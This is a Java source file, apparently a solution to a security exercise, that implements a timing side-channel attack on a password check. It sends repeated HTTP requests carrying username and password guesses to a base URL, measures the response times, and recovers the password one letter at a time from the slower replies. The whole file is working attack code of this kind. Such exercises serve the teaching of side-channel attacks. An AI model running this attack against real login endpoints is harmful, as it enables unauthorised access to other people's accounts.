import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class Solver {

    private int length;
    private String baseUrl;
    private String username;
    private double lastWorstTime;
    private Integer difficulty;
    private ArrayList<Character> checkLetter;
    private int delta;
    final private   ArrayList<Character> lowerCaseByFrequency = new ArrayList<Character>(
            Arrays.asList('p','x','q','o','w','j','s','z','e','r','d','c','u','m','f'
                    ,'h','g','i','y','b','v','k','t','n','a','l'));

    public Solver(int length, String baseUrl, String username, Integer difficulty) {
        this.length = length;
        this.baseUrl = baseUrl;
        this.username = username;
        this.difficulty = difficulty;
        checkLetter = new ArrayList<>();
    }

    public String solvePassword(){
        StringBuilder password = createFirstPassword();
        lastWorstTime = createLastWorstTime(password);

        for (int i=0;i<length;i++){
            delta = 2;
            initCheckLetter();
            password.setCharAt(i, measureTimeForGivenChars(password,i));
        }
        return password.toString();
    }




    private StringBuilder createFirstPassword() {
        StringBuilder password = new StringBuilder();
        for(int i=0;i<length;i++){
            password.append('a');
        }
        return password;
    }

    private double createLastWorstTime(StringBuilder password) {
        String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
        URLRequest urlRequest = new URLRequest(url);
        return urlRequest.measureConnectionToGivenURLMinimum(10);

    }

    private String createUrl(String baseUrl, String username, String password, Integer difficulty){
        String url_format = baseUrl + "?user=%s&password=%s&difficulty=%d";
        String url = String.format(url_format,username, password, difficulty);
        return url;
    }


    private char measureTimeForGivenChars(StringBuilder password, int charPosition) {
        int rounds = 5;
        HashMap<Character,Double> measurements = initMeasurements();

        measurements = rounds(rounds,password,charPosition,measurements);

        if(checkLetter.size()==1){
            lastWorstTime = measurements.get(checkLetter.get(0));
            System.out.println("letter in place "+ charPosition + " is "+ checkLetter.get(0));
            return checkLetter.get(0);
        }

        System.out.println("----reach risk-----");

        measurements = allMax(measurements);
        if(measurements.size()==1){
            char solvedChar = measurements.keySet().stream().findFirst().get();
            lastWorstTime = measurements.values().stream().findFirst().get();
            System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
            return solvedChar;
        }else {

            measurements.keySet();
            checkLetter = new ArrayList<>(measurements.keySet());
            measurements = rounds(10, password, charPosition, measurements);
            char solvedChar = measurements.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getKey();
            System.out.println("letter in place " + charPosition + " is " + solvedChar);
            lastWorstTime = measurements.get(solvedChar);
            return solvedChar;

        }
    }

    private HashMap<Character,Double> rounds (int numOfRounds, StringBuilder password, int charPosition, HashMap<Character,Double> measurements){
        HashMap<Character,Double> riskMeasure = new HashMap<>(measurements);
        for(int i=0;i<numOfRounds;i++){
            if(measurements.size()==0){
                return riskMeasure;
            }
            for(int j=0;j<checkLetter.size();j++){
                riskMeasure = new HashMap<>(measurements);
                password.setCharAt(charPosition,checkLetter.get(j));
                String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
                URLRequest urlRequest = new URLRequest(url);
                double time = urlRequest.measureConnectionToGivenURLMinimum(2);
                if(time- lastWorstTime<delta || measurements.get(checkLetter.get(j))-lastWorstTime<delta){
                    measurements.remove(checkLetter.get(j));
                    continue;
                }
                if(time<measurements.get(checkLetter.get(j))){
                    measurements.put(checkLetter.get(j),time);
                }
            }
            measurements.keySet();
            checkLetter =  new ArrayList<>(measurements.keySet());
        }
        if(measurements.size()==0){
            return riskMeasure;
        }else{
            return measurements;
        }

    }

    private HashMap<Character, Double> allMax(HashMap<Character, Double> measurements) {
        double max = measurements.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getValue();
        HashMap<Character, Double> result = new HashMap<>();
        for (Map.Entry<Character, Double> entry : measurements.entrySet()) {
            if (entry.getValue().equals(max)) {
                result.put(entry.getKey(),entry.getValue());
            }
        }
        return result;

    }

    private HashMap<Character, Double> initMeasurements() {
        HashMap<Character, Double> result = new HashMap<>();
        for(Character c: lowerCaseByFrequency){
            result.put(c,300.0);
        }
        return result;
    }

    private void initCheckLetter() {
        checkLetter = lowerCaseByFrequency;
    }



}
